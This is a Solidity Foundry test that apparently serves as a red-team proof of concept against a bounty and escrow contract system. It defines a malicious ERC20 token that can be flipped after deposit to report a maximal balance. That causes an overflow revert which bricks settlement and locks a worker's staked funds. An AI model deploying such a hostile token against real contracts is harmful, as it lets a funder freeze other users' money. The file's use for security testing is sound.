// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {WorkMarketDeployer} from "../contracts/deployables/bounty/WorkMarketDeployer.sol";
import {Bounty} from "../contracts/deployables/bounty/Bounty.sol";
import {Escrow} from "../contracts/deployables/bounty/Escrow.sol";
import {Reputation} from "../contracts/deployables/bounty/Reputation.sol";
import {IBounty} from "../contracts/interfaces/dao/deployables/IBounty.sol";
import {IEscrow} from "../contracts/interfaces/dao/deployables/IEscrow.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @dev Reward token that is CONFORMANT at deposit, then (funder flips `evil`) reports
/// balanceOf == type(uint256).max while `transfer` still "succeeds". balanceOf does NOT revert
/// and returns a full 32-byte word, so the escrow's staticcall guard (okBefore/okAfter) is
/// SATISFIED — but the delta check `balAfter + amount <= balBefore` then computes
/// `type(uint256).max + amount` in CHECKED arithmetic => Panic(0x11) => bubbles.
contract MaxBalanceERC20 is ERC20 {
    bool public evil;
    constructor() ERC20("MaxBal", "MAX") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
    function setEvil(bool v) external { evil = v; }
    function balanceOf(address a) public view override returns (uint256) {
        if (evil) return type(uint256).max; // valid 32-byte word, no revert
        return super.balanceOf(a);
    }
    function transfer(address to, uint256 amt) public override returns (bool) {
        if (evil) return true; // "success", moves nothing — but we panic before this matters
        return super.transfer(to, amt);
    }
}

contract RedPoCOverflow is Test {
    Bounty internal bounty;
    Escrow internal escrow;

    address internal funder = address(0xF4DE7);
    address internal worker = address(0x9A0);
    address internal approver = address(0xA999);
    address internal arbiter = address(0xA981E7);

    uint256 internal constant STAKE = 1 ether;
    uint64 internal constant WINDOW = 3 days;
    uint64 internal constant REVIEW = 3 days;

    function setUp() public {
        WorkMarketDeployer wm = new WorkMarketDeployer(
            address(this), address(0), 10e18, address(new Escrow()), address(new Reputation()), address(new Bounty())
        );
        bounty = Bounty(wm.bounty());
        escrow = Escrow(payable(wm.escrow()));
    }

    function _fund(MaxBalanceERC20 tok) internal returns (uint256 id) {
        tok.mint(funder, 100e18);
        vm.startPrank(funder);
        tok.approve(address(escrow), 100e18);
        id = bounty.propose(
            IBounty.RewardSpec({kind: IEscrow.AssetKind.ERC20, token: address(tok), tokenId: 0, amount: 100e18}),
            address(0), STAKE, approver, arbiter, WINDOW, REVIEW, "poc"
        );
        bounty.fund(id); // conformant deposit while healthy
        vm.stopPrank();
    }

    /// PROOF: a funder-chosen token that returns balanceOf == uint256.max at settlement makes
    /// accept() revert with Panic(0x11) (arithmetic overflow in `balAfter + amount`), bricking the
    /// settlement and LOCKING the worker's (real, native) stake. This is the exact class R3-M1
    /// claims to have closed ("no settlement-path external view can revert-bubble").
    function test_MaxBalanceOfReward_OverflowBubbles_BricksAccept_LocksStake() public {
        MaxBalanceERC20 tok = new MaxBalanceERC20();
        uint256 id = _fund(tok);

        vm.deal(worker, STAKE);
        vm.prank(worker);
        bounty.claim{value: STAKE}(id, arbiter); // worker stakes REAL native value
        vm.prank(worker);
        bounty.submit(id, "delivered");

        tok.setEvil(true); // funder flips the token AFTER work is submitted

        // R3-M1 invariant says this must settle (credit-on-unverifiable), never bubble.
        // Instead it reverts with a checked-arithmetic Panic — the settlement is bricked.
        vm.prank(approver);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
        bounty.accept(id);

        // Consequences: bounty stuck in Submitted, worker's native stake locked in escrow.
        assertEq(uint8(bounty.stateOf(id)), uint8(IBounty.State.Submitted), "stuck: not Paid");
        assertEq(worker.balance, 0, "worker stake NOT returned (locked)");
        assertEq(address(escrow).balance, STAKE, "escrow still holds the worker's stake");

        // finalize() is bricked identically (also routes through release(reward)).
        vm.warp(block.timestamp + REVIEW + 1);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x11));
        bounty.finalize(id);
        assertEq(worker.balance, 0, "stake STILL locked after finalize attempt");
    }
}
